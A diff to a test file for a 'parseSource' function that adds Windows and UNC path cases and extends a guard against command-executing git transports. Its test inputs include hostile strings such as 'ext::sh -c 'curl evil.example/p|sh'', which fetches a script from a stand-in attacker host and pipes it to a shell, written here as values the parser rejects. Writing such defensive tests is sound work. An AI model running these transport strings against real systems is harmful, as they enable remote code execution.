@@ -163,7 +163,29 @@ describe('parseSource', () => {
     expect(parseSource('   ')).toBeNull();
   });
 
+  test('classifies Windows absolute paths as local', () => {
+    expect(parseSource('C:/path/to/dir')).toEqual({ kind: 'local', path: 'C:/path/to/dir' });
+    expect(parseSource('C:\\path\\to\\dir')).toEqual({
+      kind: 'local',
+      path: 'C:\\path\\to\\dir',
+    });
+    expect(parseSource('d:\\skills')).toEqual({ kind: 'local', path: 'd:\\skills' });
+    expect(parseSource('\\\\server\\share\\skills')).toEqual({
+      kind: 'local',
+      path: '\\\\server\\share\\skills',
+    });
+    expect(parseSource('file:///C:/path/to/dir')).toEqual({
+      kind: 'local',
+      path: 'C:/path/to/dir',
+    });
+    expect(parseSource('file:///C:\\path\\to\\dir')).toEqual({
+      kind: 'local',
+      path: 'C:\\path\\to\\dir',
+    });
+  });
+
   test('rejects command-executing git transports (ext:: RCE guard)', () => {
+    expect(parseSource('x::sh -c evil')).toBeNull();
     expect(parseSource("ext::sh -c 'curl evil.example/p|sh' x://y")).toBeNull();
     expect(parseSource('ext::curl evil.example')).toBeNull();
     expect(parseSource('fd::17/foo')).toBeNull();
